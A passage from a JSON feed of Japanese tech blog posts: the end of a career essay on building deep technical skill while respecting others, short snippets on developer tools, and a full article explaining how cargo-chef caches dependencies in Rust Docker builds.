コミュニケーション力だけでは、技術的な意思決定はできません。表面的な理解では、アーキテクチャ設計はできません。自分が技術を深く理解していなければ、若手を育成することもできません。早期のマインド切り替えと継続的な努力「追いつけない」ではなく「只々積み上げる」元の記事には、圧倒的なテックリードを見て「自分が3に行けることはないと実感した」という記述があった。この気持ちはよくわかります。圧倒的な技術力を持つ人を目の当たりにしたとき、「自分には無理だ」と感じる瞬間は、多くのエンジニアが経験することです。しかし、そのテックリードもまた、努力の積み重ねでそこに到達しているということを忘れてはいけません。彼らは最初から「創る」状態にいたわけではません。膨大な時間をかけて技術を学び、無数のエラーと格闘し、何度も失敗を繰り返し、そして徐々に深い理解を獲得していった。「あの人は天才だから」と片付けてしまうのは、その人が積み重ねてきた努力を見ないことになります。そして、自分自身の成長の可能性を閉ざすことにもなります。その積み重ねを軽く見てはいけません。確かに、技術に対する偏愛や衝動の強さは人それぞれです。しかし、それでもなお、努力で到達できる範囲は思っているより広いです。 毎日1時間でもいいです、技術書を読みましょう。個人プロジェクトに取り組みましょう。エラーメッセージと真剣に向き合いましょう。こういった地道な積み重ねが、1年後、3年後、5年後の自分を作ります。技術力が高いエンジニアは、キャリアの中盤以降も選択肢が広がり続けます。一方、主要技術について表面的な理解に留まっているエンジニアは、選択肢が狭まっていきます。これが、早期に技術力を磨くことの重要性です。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazonやる気は行動の後からついてくる「技術を学ばなければ」と頭では理解していても、なかなか実行に移せません。モチベーションが湧かません。やる気が出ません。こういった悩みを抱えている人は多い。しかし、ここで重要な真実があります。やる気を出すには、やるしかません。多くの人は「やる気が出たら始めよう」と考える。しかし、これは因果が逆です。やる気は行動の前に現れるものではなく、行動の後からついてくるものです。心理学の研究でも明らかになっているが、人間の脳は「行動を始めてから」やる気を出すようにできています。作業興奮という現象です。まずは5分だけコードを書いてみる。1ページだけ技術書を読んでみる。すると、脳が活性化し、自然と続けたくなります。「理想的な環境が整ったら」「十分な時間ができたら」「気分が乗ったら」——こういった条件を待っていても、その日は永遠に来ません。理想的な状態を待つのではなく、不完全なままでも始めることです。毎日30分でいいです。週末の2時間でいいです。小さく始めて、継続しましょう。それが1ヶ月、3ヶ月、1年と続けば、気づいたときには大きな差になっています。「やる気が出ないから動けない」のではなく、「動かないからやる気が出ない」のです。だから、やる気を出すには、やるしかありません。 今この瞬間から、小さな一歩を踏み出しましょう。ジェームズ・クリアー式 複利で伸びる1つの習慣作者:ジェームズ・クリアーパンローリング株式会社Amazon学生のうちに気づけるなら私が最も伝えたいのは、早期にマインドを切り替え、只々研鑽を積み重ねることの重要性だ。早く気づけば気づくほど、リカバリーは容易になります。学生なら今が絶好のタイミングです。時間はたっぷりあります。大学の授業だけでなく、個人プロジェクト、OSS、インターン——自分に合った形で技術と向き合いましょう。一時の成功も失敗も、長い人生の中では泡のようなものです。 今日のコンテストでの勝利も、明日の挫折も、それ自体は大した意味を持たません。重要なのは、そこから何を学び、次にどう活かすかです。そして、本当のトップレベルを見に行こう。 自分より優秀な人たちがいる環境に飛び込み、「ボコボコにされる」経験をしましょう。それは屈辱的かもしれないが、それこそが成長のチャンスです。ただし、一度の挫折で諦めないでほしいです。 圧倒的な実力差を見せつけられても、それは終わりではありません。自分の現在地を知る機会です。そこから、只々積み上げていけばいいです。社会人になってから気づいても遅くはない20代であっても、キャリアの中盤であっても、「技術力を磨かなければ」と気づいた時点から始めれば、必ず変わります。ただし、学生時代より難易度は上がります。家庭があるかもしれません。体力も落ちているかもしれません。それでも、今から本気で取り組めば、道は開けます。業務時間外の勉強を習慣化しましょう。技術書を読みましょう。個人プロジェクトを作りましょう。2〜3年本気で取り組めば、主要技術について表面的な理解から深い理解へと確実に移行できます。そうなれば、市場価値は大きく変わります。気づいた時点が、あなたにとっての「今」です。過去を悔やむより、今から只々積み上げていきましょう。キャリア戦略の選択肢エンジニアとして生きていく上で、大きく分けて2つの戦略があります。選択肢1: 技術のスペシャリストを目指す本気で技術を磨き、技術者として高い評価を得られるエンジニアになります。これは楽な道ではません。業務時間外も勉強し、常に新しい技術にキャッチアップし、OSSにコントリビュートし、深夜までコードを書きます。しかし、その努力は報われる。キャリアの中盤で選択肢が広がり、技術者としての充実感を得られます。市場価値も高く、転職の選択肢も豊富です。スタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazon選択肢2: 技術とビジネスのバランス型を目指す設計力/実装力は一定レベルに抑え、組織貢献や事業・顧客貢献で価値を出す。プロダクトマネージャーやエンジニアリングマネージャーを目指す道です。これも立派な戦略です。しかし、技術の基礎理解は必須です。 表面的な理解だけで「マネジメントに進む」というのは、逃げに過ぎません。マネージャーやPMになっても、技術を深く理解していなければ、チームから信頼されず、技術的な制約や可能性を踏まえた意思決定もできません。どちらを選ぶにせよ、技術力に優劣があることを認め、自分の現在地を正確に把握することが、全ての出発点です。 そして、気づいた時点から、只々積み上げていくことが大切です。エンジニアのためのマネジメントキャリアパス ―テックリードからCTOまでマネジメントスキル向上ガイド作者:Camille FournierオライリージャパンAmazon一つの物差しで人を測るなここまで技術力の重要性を語ってきたが、同時に伝えておきたいことがあります。学生時代から社会人の初期にかけて、私はカンファレンスやイベントで、相手の技術的な知識を試すような会話をしていました。わざと難しい質問を投げかけて、相手が答えられないのを見て優越感に浸る。今振り返ると、最低です。当時の私は、技術力の有無だけで人間の優劣を測っていました。学生のギーク層にありがちな行動だが、自分がイキれる相手を見つけて、マウントを取るのは確かに気持ちがいい。でも、それは恥ずべき行為です。他者と働く──「わかりあえなさ」から始める組織論 (NewsPicksパブリッシング)作者:宇田川元一ニューズピックスAmazonただし、逆の極端も問題だと思っています。世の中には「技術力なんてどうでもいい、面白い人間かどうかが全て」という価値観もあります。確かに、人間的な魅力は重要です。でも、それを唯一の評価軸にして「技術バカは使えない」「コミュ力こそ全て」と言い切るのも、結局は別の物差しで人を測っているだけです。技術力で人を測るのも、コミュ力で人を測るのも、面白さで人を測るのも、本質的には同じ過ちです。この記事で私は「技術力の優劣を直視せよ」と書いてきた。市場価値という文脈では、技術力の差は厳然として存在します。それを無視してキャリアを語ることはできません。しかし、それはあくまで市場価値という一つの軸での話です。 技術力が高いからといって人として偉いわけではません。逆に、技術力が低いからといって人として劣っているわけでもません。イベントで出会った人が、あなたより技術的な知識が少ないように見えても、その人にはその人の文脈があります。学びの途中かもしれません。別の分野のエキスパートかもしれません。技術以外の部分で圧倒的な価値を生み出している人かもしれません。大切なのは、相手の文脈を読み取って会話できることです。 自分の得意な物差しだけで人を評価し、優越感に浸るのは、いくら専門性が高くても人として未熟です。技術力を磨くことと、人として成熟することは、まったく別の話なのだから。「何回説明しても伝わらない」はなぜ起こるのか？　認知科学が教えるコミュニケーションの本質と解決策作者:今井むつみ日経BPAmazonおわりに長々と書いてきたが、最後にもう一度、元の記事への敬意を示したい。元の記事は、学生たちを励まし、多様性を尊重し、相互リスペクトを訴える、とても温かい内容でした。その優しさと配慮は、本当に素晴らしいと思います。私はこの記事で「技術力に優劣はある」と主張してきた。それは市場価値やキャリアという観点では事実です。しかし同時に、技術力で人間の価値を測ってはいけません。技術力が高いことと、人として成熟していることは別物です。むしろ、技術力があるからこそ、謙虚さとリスペクトを忘れてはいけません。「優劣はない」という優しい言葉に安住せず、現実を直視してほしいです。そして、今のうちに本気で技術を学んでほしいです。キャリアは中長距離走です。 今なら、まだ間に合います。ただし、技術を学ぶ過程で、決して人を見下してはいけません。相手の文脈を理解し、リスペクトを持ってコミュニケーションを取りましょう。それができて初めて、優秀なエンジニアと言えるのだと思います。Googleのソフトウェアエンジニアリング ―持続可能なプログラミングを支える技術、文化、プロセスオライリージャパンAmazonこの記事は、元の記事の筆者や読者を否定する意図はありません。対象読者ではない私が横から口を出すような形になってしまい申し訳ありませんが、学生時代の自分に伝えたかったこと、そして過去の自分を反省する気持ちを込めて書きました。","isoDate":"2025-10-27T04:46:29.000Z","dateMiliSeconds":1761540389000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"コマンド紹介シリーズ：sshm","link":"https://zenn.dev/akasan/articles/6d97f52cccfeef","contentSnippet":"コマンド紹介シリーズ第15回目の本日はsshmを紹介しようと思います。sshmを利用するとsshの設定に関してTUIインターフェースで操作できます。なお、第14回は以下になりますので、ぜひご興味があればご覧ください。https://zenn.dev/akasan/articles/80f8931f8523cd sshmとは？公式GitHubによると、sshmは、SSHホストの管理と接続方法を変革する美しいコマンドラインツールです。Go言語で構築され、直感的なTUIインターフェースを備えているため、SSH接続管理が簡単かつ快適になります。とのことで、SSHホストをTUIで...","isoDate":"2025-10-26T10:19:23.000Z","dateMiliSeconds":1761473963000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Astro で Standard ML のシンタクスハイライト","link":"https://silasol.la/posts/2025-10-26-02_astro-sml/","contentSnippet":"デフォルトでハイライトされない言語を TextMate を用いた拡張で認識させます．","isoDate":"2025-10-26T00:00:00.000Z","dateMiliSeconds":1761436800000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"Rayシリーズ：Ray Dataへの入門 ~quickstart~","link":"https://zenn.dev/akasan/articles/3cdf0bd79a898a","contentSnippet":"今回はRayでデータを取り扱うためのRay Dataについて、Quickstartを通して入門してみました。 Ray Dataとは？Ray Dataは、Ray上に構築されたMLとAIワークロードのためのスケーラブルなデータ処理ライブラリです。 バッチ推論やデータ前処理、MLトレーニングのためのインジェストなど、AIワークロードを表現するための柔軟で高性能なAPIを提供してくれます。他の分散データシステムとは異なり、Ray Dataはストリーミング実行を特徴としており、大規模なデータセットを効率的に処理し、CPUとGPUの両方のワークロードで高い利用率を維持します。Ray Data...","isoDate":"2025-10-25T12:05:51.000Z","dateMiliSeconds":1761393951000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"30歳を迎えたMLエンジニアが今後の計画を考えてみた","link":"https://zenn.dev/akasan/articles/35d7eeebb7a84c","contentSnippet":"本日筆者は30歳を迎えまして、人生のある意味節目なので今後のプランを考えてみました。 まずは20代を振り返る 何をやってきたか22際から新卒エンジニアとして働き始めて8年程度でしょうか、色々な業務をこなしてきました。ざっと上げただけでもこんな感じですかね。ソフトウェア開発OCRを利用した業務効率化ソフトウェアの改修データ分析ソフトウェアの設計・開発プログラミング効率化のためのソフトウェア開発異常検知モデルの結果や設定をするためのWebアプリケーションの実装ロボット制御開発経路計画立案システムの構築ロボットの制御ソフトウェア開発ロボット制御のための回路...","isoDate":"2025-10-24T13:09:25.000Z","dateMiliSeconds":1761311365000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"anyenvやasdfに代わる？miseで始める開発環境管理","link":"https://sreake.com/blog/mise-development-env-management/","contentSnippet":"はじめに 開発環境の構築において「このプロジェクトは Node.js 16 系だけど、別の案件は 18 系じゃないと動かない」といった状況に遭遇することは少なくありません。 プロジェクトごとに異なる言語やツールのバージョ […]The post anyenvやasdfに代わる？miseで始める開発環境管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-24T12:34:35.000Z","dateMiliSeconds":1761309275000,"authorName":"Sreake","authorId":"Sreake"},{"title":"NeMo Guardrailsを試してみた","link":"https://zenn.dev/akasan/articles/0b825a53e78e06","contentSnippet":"今回はNVIDIAが提供するNeMo Guardrailsを利用してみました。NeMo Guardrailsを利用することでプログラムを用いてガードレール機能を導入することができます。 NeMo Guardrailsとは？こちらの解説によると、NeMo Guardrails はプログラム可能なガードレールを LLM ベースの対話システムに簡単に追加するための OSS です。NeMo Guardrails を使用する事で、簡単なコンフィグレーションの作成と Python によるコーディングのみで、信頼性のある、安全でセキュアな LLM 対話システムの構築を簡単に行う事ができます。...","isoDate":"2025-10-23T14:18:27.000Z","dateMiliSeconds":1761229107000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Go + React(TypeScript)の実装で理解するCORS","link":"https://zenn.dev/takehiro1111/articles/go_cors_implement","contentSnippet":"1.記事を書いた背景私はインフラ側の経験が主ですが、開発チームから依頼されてS3のCORS許可ポリシーを設定することが何度かありました。ただ、その度に調べて何となく理解し直すということを繰り返していてインフラ視点での理解に留まっていて少しモヤのある状態でした。（実際にアプリ側の実装を行い、いくつかの実装パターンがあるという点も把握しないと感覚的な理解が得にくい設定だと思います。）今回、GoのAPI開発を通してアプリケーション側でCORSを実装したことでより深く理解できたので、自分の知識を整理する目的で本記事をまとめています。 2.対象読者CORSの概念や設定について...","isoDate":"2025-10-23T08:42:30.000Z","dateMiliSeconds":1761208950000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Gemini CLI でセキュアで堅牢な開発をするためのプラクティス集","link":"https://zenn.dev/kimitsu/articles/secure-and-robust-development-with-gemini-cli","contentSnippet":"先日、クラウドネイティブ \xd7 Gemini CLIというイベントで『Gemini CLI でもセキュアで堅牢な開発をしたい！』というタイトルで登壇させていただきました。時間都合で端折ってしまった部分が多かったため、本記事で行間を埋めつつ最新の状況をお伝えします。登壇の内容は全て記載するため、イベントに参加されなかった方も読んでいただければと思います。 はじめに本記事は Gemini CLI を個人レベルではなく企業やチームとして使いたい方を対象とします。そのため、Gemini CLI の基本的な部分（例えばどのようにインストールするか、settings.jsonとは何か、基本...","isoDate":"2025-10-23T01:52:31.000Z","dateMiliSeconds":1761184351000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Go/Ginでslogを使ったロギングのミドルウェア実装","link":"https://zenn.dev/takehiro1111/articles/go_gin_logger","contentSnippet":"1.記事を書いた背景自分の整理用とこんな書き方もあるんだ程度に参考になればと思い記事に起こしています。実装を進める中で変なスイッチも入り、様々な機能を追加していきました。結果的にリクエストボディのマスキングや分散トレーシングのためのリクエストID生成など、本番環境での使用を一定想定した機能を実装しました。 2.機能要件箇条書きで見づらいと思いますが、以下の機能を付け足してます。- ミドルウェアとして実装してラップすることで全てのエンドポイントに適用できる。- 時刻等の可変性のある設定については、依存性を注入し実装すること。  - テストコードでMockを...","isoDate":"2025-10-21T09:05:31.000Z","dateMiliSeconds":1761037531000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Gemini CLIでもセキュアで堅牢な開発をしたい！","link":"https://speakerdeck.com/yunosukey/gemini-clidemosekiyuadejian-lao-nakai-fa-wositai","contentSnippet":"","isoDate":"2025-10-19T04:00:00.000Z","dateMiliSeconds":1760846400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"GitHub Actions の Job から WireGuard で VPN アクセス","link":"https://qiita.com/yteraoka/items/eef62dc05aa96fbed3b6","contentSnippet":"背景GitHub Actions の Job で家のネットワークにアクセスさせたいことがあり、いったんは Squid を認証付きで publilc に公開するというのをやっていたのですが、やっぱり嬉しくないのでどうしたものかと思っていたのですが WireGuard が使...","isoDate":"2025-10-18T09:09:27.000Z","dateMiliSeconds":1760778567000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"cargo-chefがRustのDockerビルドを高速化する話","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/18/163911","contentSnippet":"はじめに前回の記事では、Rust の Docker イメージサイズを 98%削減する方法を解説しました。その中で最も重要な役割を果たしているのが cargo-chef です。この記事では、cargo-chef の仕組みと動作原理を深く掘り下げていきます。syu-m-5151.hatenablog.comcargo-chef は、Docker のレイヤーキャッシングと Cargo のビルドモデルの根本的な不整合を解決し、Rust プロジェクトのDockerビルドを5倍高速化します。Luca Palmieri が「Zero to Production In Rust」のために作成したこのツールは、ソースコード変更のたびに 20 分以上かかっていたリビルドを、依存関係をアプリケーションコードから分離してキャッシュし、2〜3 分のビルドに変えました。www.zero2prod.comcargo-chef は依存関係情報のみを捉えた「レシピ」を作成し、ソースコードが変更されても有効なままの別レイヤーで高コストな依存関係のコンパイルをキャッシュできます。約 500 の依存関係を持つ商用コードベースでは、ビルド時間が約 10 分から約 2 分に短縮され、CI/CD の速度とインシデント対応時間に直接影響を与えます。github.comRustのDockerビルドにおける根本的な問題Docker のレイヤーキャッシングは、各命令(RUN、COPY、ADD)に対してレイヤーを作成します。いずれかのレイヤーが変更されると、そのレイヤーとそれ以降のすべてのレイヤーが無効化されます。標準的な Rust Dockerfile は重大な問題に直面します: 依存関係のマニフェストとソースコードの両方を一緒にコピーする必要があるため、ソースの変更があるとビルドキャッシュ全体が無効になってしまうのです。問題のあるパターン:FROM rust:1.75WORKDIR /appCOPY . .              # マニフェストとソースを一緒にコピーRUN cargo build       # 変更のたびにすべてを再ビルドPython の pip install -r requirements.txt や Node の npm install とは異なり、Cargoには依存関係のみをビルドするネイティブな方法がありません。cargo build コマンドは、依存関係とソースのコンパイルを統一された操作として扱います。cargo build --only-deps のようなフラグは存在しません。このアーキテクチャ上の制限により、他の言語では美しく機能する標準的な Docker パターンが、Rust では壊滅的に失敗してしまいます。影響は開発ワークフロー全体に波及します。すべてのコード変更—たった 1 文字の修正でさえ—数百の依存関係の完全な再コンパイルを引き起こします。2〜4 コアの CI システムでは、ビルドが 30 分を超えることがあります。これにより、デプロイ速度、インシデント対応時間、開発者の反復サイクルに厳しい下限が生まれます。本番環境のインシデントで緊急パッチが必要な場合、その 20 分のビルドが 20 分のダウンタイムになります。Rustのビルドが特に問題になる理由Rust のコンパイルモデルは、コンパイル時間の速度よりも実行時パフォーマンスを優先します。リリースビルド(--release)は、中規模のプロジェクトで 15〜20 分かかる広範な LLVM 最適化パスを実行します。ジェネリクス、トレイト特殊化、単相化の多用により、依存関係は各使用パターンに対して相当量のコードをコンパイルします。非同期エコシステム(tokio、actix-web、tonic)はこれを悪化させます—これらのクレートは単純なアプリケーションでもコンパイルが重いのです。インクリメンタルコンパイルは存在しますが、リリースビルドではデフォルトで無効になっており、外部依存関係には役立ちません。Docker の本番ビルドは常に --release プロファイルを使用するため、遅いコンパイルパスを避けられません。依存関係のコンパイルは通常、総ビルド時間の 80〜90%を消費しますが、これらの依存関係はアプリケーションコードに比べてほとんど変更されません。この逆転した関係—最も遅い部分が最も変更されない—こそが、cargo-chef が活用するポイントです。アーキテクチャプロジェクト構造:src/main.rs - コマンドパースを含む CLI エントリポイントsrc/lib.rs - ライブラリエントリポイントsrc/recipe.rs - レシピ生成、依存関係ビルド、クッキングロジックsrc/skeleton.rs - プロジェクトスケルトンの作成とダミーファイル生成cargo-chef のアーキテクチャは 2 つの抽象化を中心としています: RecipeとSkeleton。Recipe はシリアライズ可能なコンテナで、Skeleton は実際のマニフェストデータとロックファイルを含みます。これらの構造により、コアワークフローが可能になります: 分析 → シリアライズ → 再構築 → ビルド。レシピコンセプトと動作原理「レシピ」は、ソースコードなしで依存関係をビルドするために必要な最小限の情報を捉えたJSONファイル(recipe.json)です。これは Python の requirements.txt と同じ目的を果たしますが、Rust のより複雑なプロジェクト構造に対応しています。レシピの内容:プロジェクト全体のすべての Cargo.toml ファイルとその相対パスCargo.lock ファイル(存在する場合)、正確な依存関係バージョンのためすべてのバイナリとライブラリの明示的な宣言—正規の場所(src/main.rs、src/lib.rs)にあるものでもスケルトン再構築のためのプロジェクト構造メタデータpub struct Recipe {    pub skeleton: Skeleton,}pub struct Skeleton {    manifests: Vec<Manifest>,    lock_file: Option<String>,}この構造は人間が読める JSON にシリアライズされ、レシピはデバッグ可能で検査可能です。明示的なターゲット宣言により、Cargo が通常ファイルの場所からターゲットを推測する場合でも、信頼性の高いキャッシュが保証されます。動作原理と内部メカニズムcargo-chef は、マルチステージビルドで連携する 2 つのコマンドを提供します:1. cargo chef prepare --recipe-path recipe.jsonこのコマンドは次のように現在のプロジェクトを分析します。ベースパスからディレクトリを再帰的にトラバース相対パスを保持してすべての Cargo.toml ファイルを収集依存関係バージョンロックのために Cargo.lock を読み取りSkeleton データ構造を作成マニフェスト内の明示的なターゲット宣言を確保recipe.json にシリアライズprepare コマンドは高速(通常 1 秒未満)です。ファイル構造を分析して TOML をパースするだけで、コンパイルは行わないためです。2. cargo chef cook --release --recipe-path recipe.jsonこのコマンドは次のように再構築とビルドを行います。recipe.json を Skeleton に逆シリアライズskeleton.build_minimum_project() を呼び出してディレクトリ構造を再作成すべての Cargo.toml ファイルを相対パスに書き込みCargo.lock をディスクに書き込みすべてのターゲット(main.rs、lib.rs、build.rs)に対してダミーソースファイルを作成指定されたフラグで cargo build を実行skeleton.remove_compiled_dummies() 経由でコンパイル済みダミーアーティファクトを削除ダミーファイルトリック: cargo-chef は次のように最小限の有効な Rust ファイルを作成します。// ダミーのmain.rsfn main() {}// ダミーのlib.rs// (空または最小限)これらは Cargo がコンパイル可能なプロジェクトを要求する条件を満たしますが、実際のロジックは含まれていません。その後、Cargo は通常通りすべての依存関係を解決してコンパイルし、キャッシュされたアーティファクトを生成します。ダミーアーティファクトは後でクリーンアップされ、外部依存関係のコンパイル結果のみが残ります。重要な技術的制約: cook とその後の build コマンドは、同じ作業ディレクトリから実行すべきです。これは、target/debug/deps 内の Cargo の *.d ファイルにターゲットディレクトリへの絶対パスが含まれているためです。ディレクトリを移動するとキャッシュの利用が壊れます。これは cargo-chef の制限ではなく、cargo-chef が尊重する Cargo の動作です。Docker統合とマルチステージビルドcargo-chef は、Docker のマルチステージビルド機能用に特別に設計されています。標準的なパターンは 3 つのステージを使用します:標準的な3ステージパターン:FROM lukemathwalker/cargo-chef:latest-rust-1 AS chefWORKDIR /app# ステージ1: Planner - レシピを生成FROM chef AS plannerCOPY . .RUN cargo chef prepare --recipe-path recipe.json# ステージ2: Builder - 依存関係をキャッシュFROM chef AS builderCOPY --from=planner /app/recipe.json recipe.jsonRUN cargo chef cook --release --recipe-path recipe.json# ↑ このレイヤーは依存関係が変更されるまでキャッシュされる# 次にソースをコピーしてアプリケーションをビルドCOPY . .RUN cargo build --release --bin app# ステージ3: Runtime - 最小限の本番イメージFROM debian:bookworm-slim AS runtimeWORKDIR /appCOPY --from=builder /app/target/release/app /usr/local/binENTRYPOINT [\\"/usr/local/bin/app\\"]キャッシングの仕組み:各 Docker ステージは独立したキャッシングを維持します。ステージは COPY --from 文を通じてのみやり取りします。この分離が cargo-chef の効果の鍵です。planner ステージの COPY . . は planner キャッシュを無効化(ただしこれは高速)Planner はフルソースツリーから recipe.json を生成Builder ステージは COPY --from=planner 経由で recipe.json のみを受け取るrecipe.jsonのチェックサムが変更されていない限り、builderの依存関係レイヤーはキャッシュされたままCargo.toml または Cargo.lock が変更された場合にのみ recipe.json が変更されるソースコードの変更は recipe.json に影響しないため、依存関係レイヤーはキャッシュされたままキャッシュ無効化ロジック:ソースコード変更 → plannerステージ無効化                → recipe.json変更なし                → builderの依存関係レイヤーキャッシュ済み ✓                → アプリケーションビルドのみ実行依存関係変更    → plannerステージ無効化                → recipe.json変更                → builderの依存関係レイヤー無効化 ✗                → フルリビルド必要これはインセンティブを完璧に整合させます: 高コストな操作(依存関係コンパイル)は、そうあるべき時(依存関係が変更されていない時)にキャッシュされ、高速な操作(ソースコンパイル)は期待通り毎回の変更で実行されます。ビルドプロセスの統合とサポート機能cargo-chef は標準的な Cargo ワークフローとシームレスに統合し、ビルドカスタマイズの全範囲をサポートします:ビルドコマンド:build(デフォルト)check(--check フラグ経由)clippyzigbuildサポートされるオプション:プロファイル選択: --release、--debug、カスタム --profile機能: --features、--no-default-features、--all-featuresターゲット: --target、--target-dir(ファーストクラスのクロスコンパイルサポート)ターゲットタイプ: --benches、--tests、--examples、--all-targets、--bins、--binワークスペース: --workspace、--package、--manifest-pathCargo フラグ: --offline、--frozen、--locked、--verbose、--timingsツールチェーンオーバーライド: cargo +nightly chef cookワークスペースサポートは自動です。cargo-chef はワークスペース内のすべてのクレートを検出し、正しく処理します。ファイルやクレートが移動しても、cargo-chef は自動的に適応します—Dockerfile の変更は不要です。これは、プロジェクト構造をハードコードする手動アプローチに対する大きな利点です。ビルド済みDockerイメージは Docker Hub の lukemathwalker/cargo-chef で利用可能で、柔軟なタグ付けができます。latest-rust-1.75.0(特定の Rust バージョンの最新 cargo-chef)0.1.72-rust-latest(最新の Rust の特定 cargo-chef)Alpine バリアント: latest-rust-1.70.0-alpine3.18バージョンの一貫性: すべてのステージで同一のRustバージョンを使用すべきです。バージョンの不一致は、異なるコンパイラバージョンが異なるアーティファクトを生成するため、キャッシングを無効化します。主要機能と実用的なユースケース主なユースケース:1. CI/CDパイプラインの最適化 - 標準的なユースケースです。すべてのコード変更が CI で Docker ビルドをトリガーします。cargo-chef なしでは、各ビルドが 500 以上のすべての依存関係を再コンパイルします(10〜20 分)。cargo-chef があれば、変更されていない依存関係はキャッシュされ、ビルドは 2〜3 分に短縮されます。これは次のような点に直接影響します。デプロイ速度(機能をより速くリリース)インシデント対応(本番環境をより速くパッチ)開発者体験(PR へのより速いフィードバック)インフラコスト(消費される CPU 分の削減)2. マルチステージビルド - ビルド環境とランタイム環境を分離。ビルダーステージは完全な Rust ツールチェーン(800MB 以上)を含み、ランタイムステージは最小イメージ(25〜50MB)を使用します。cargo-chef は、高コストなビルダーステージをキャッシュ状態に保つことで、このパターンを実用的にします。3. ワークスペース/モノレポプロジェクト - 依存関係を共有する複数のバイナリとライブラリを自動的に処理します。手動アプローチはワークスペースで破綻します; cargo-chef は透過的に処理します。4. クロスコンパイル - --target フラグ経由でファーストクラスサポート。例: Alpine Linux デプロイのために x86_64-unknown-linux-musl バイナリを CI でビルド。ターゲット指定は依存関係キャッシング中に尊重されます。高度な最適化戦略:sccacheとの組み合わせ:FROM rust:1.75 AS baseRUN cargo install --locked cargo-chef sccacheENV RUSTC_WRAPPER=sccache SCCACHE_DIR=/sccache# ... plannerステージ ...FROM base AS builderRUN --mount=type=cache,target=$SCCACHE_DIR,sharing=locked \\\\    cargo chef cook --release --recipe-path recipe.jsonこの組み合わせは2層のキャッシングを提供します。cargo-chef: 粗粒度(依存関係レイヤー全体)sccache: 細粒度(個々のコンパイルアーティファクト)1 つの依存関係が変更された場合、cargo-chef はすべてを再ビルドしますが、sccache は個々のクレートコンパイルをキャッシュします。変更された依存関係のみが実際に再コンパイルされます。BuildKitキャッシュマウント:RUN --mount=type=cache,target=/usr/local/cargo/registry \\\\    --mount=type=cache,target=/usr/local/cargo/git \\\\    cargo chef cook --release --recipe-path recipe.jsonこれは cargo レジストリ自体をキャッシュし、再ダウンロードを回避します。sccache および cargo-chef と組み合わせることで、Rust Docker ビルドの現在のベストプラクティスとなります。重要な制限と考慮事項作業ディレクトリの制約 - cargo cook と cargo build は、Cargo の *.d ファイル内の絶対パスのため、同じディレクトリから実行すべきです。これは Docker では煩わしくありませんが、認識すべきです。ローカルパス依存関係 - プロジェクト外の依存関係(path = \\"../other-crate\\" で指定)は、変更されていなくてもゼロから再ビルドされます。これは、タイムスタンプベースのフィンガープリントに関連する Cargo の制限(issue #2644)です。コピーするとタイムスタンプが変更され、フィンガープリントが無効になります。ローカル開発には不向き - cargo-chef はコンテナビルド専用に設計されています。既存のコードベースでローカルに実行すると、ファイルが上書きされる可能性があります。このツールは、ターミナル環境で実行される場合の安全警告を含みます。ワークスペースの動作 - cargo chef cook はデフォルトですべてのワークスペースメンバーをビルドします。1 つのサービスのみが必要な大規模ワークスペースの場合、これによりビルド時間が増加する可能性があります。回避策には、ターゲットビルドフラグまたはサービスごとの個別の Dockerfile が含まれます。最適なユースケース - cargo-chef は以下に最大の利益を提供します。中規模から大規模プロジェクト(500 以上の依存関係)安定した依存関係ツリー(まれに変更)頻繁なデプロイ(CI/CD 環境)共有ビルドインフラを持つチーム環境非常に小規模なプロジェクト(少数の依存関係)の場合、オーバーヘッドが利益を上回る可能性があります。設計パターンとアーキテクチャの決定注目すべき技術的決定:JSONレシピ形式 - バイナリ形式ではなく JSON を使用し、レシピは人間が読めてデバッグ可能です。recipe.json を検査して、cargo-chef が何を抽出したかを正確に確認できます。明示的なターゲット宣言 - 正規の場所にある場合でも、すべてのターゲットを明示的に宣言するように Cargo.toml を変更します。これにより、キャッシュ無効化全体で Cargo がそれらを確実に認識します。マニフェスト操作 - 手動パースではなく、ワークスペース構造へのプログラマティックアクセスに cargo_metadata クレートを使用します。これにより Cargo の進化に伴う堅牢性が提供されます。TOML順序保持 - preserve_order 機能を持つ TOML を使用して、シリアライゼーションを通じたラウンドトリップ時にマニフェスト構造の整合性を維持します。安全機能 - atty クレートを使用したターミナル検出。対話的に実行された場合の警告メッセージ。ローカル環境での偶発的なファイル上書きを防ぐために、明示的なユーザー確認が必要です。採用された設計パターン:ビルダーパターン(Recipe/Skeleton 構築)コマンドパターン(CommandArg enum)ファサードパターン(複雑さを隠すシンプルな 2 コマンドインターフェース)テンプレートメソッドパターン(build_dependencies オーケストレーション)おわりにcargo-chef は、Cargo 自体が提供しない依存関係とソースコンパイルの分離を作成することで、Rust 特有の Docker レイヤーキャッシング問題を解決します。このツールの優雅さはシンプルさにあります: 依存関係管理を再発明するのではなく、Cargo が最も得意とすることを可能にする最小限の有効なプロジェクト構造を作成し、Docker のレイヤーキャッシングメカニズムと完璧に整合します。必須のベストプラクティス:すべての Docker ステージで同一の Rust バージョンを使用cook と build 間で一貫した作業ディレクトリを維持レジストリキャッシング用の BuildKit キャッシュマウントと組み合わせる細粒度のコンパイルキャッシング用に sccache を追加最小限のランタイムイメージを持つマルチステージビルドを使用.dockerignore でビルドコンテキストを最小化cargo-chefを使用すべき場合:中規模から大規模の Rust プロジェクトCI/CD Docker ビルド安定した依存関係ツリーを持つプロジェクト高速な反復サイクルを必要とするチーム迅速なインシデント対応を必要とする本番デプロイ。cargo-chef は、Docker 経由で Rust アプリケーションをデプロイするチームにとって不可欠なツールに成熟しており、より良い開発者体験、より速いデプロイ、削減されたインフラコストに直接変換される測定可能なパフォーマンス改善を提供します。","isoDate":"2025-10-18T07:39:11.000Z","dateMiliSeconds":1760773151000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AIエージェント入門 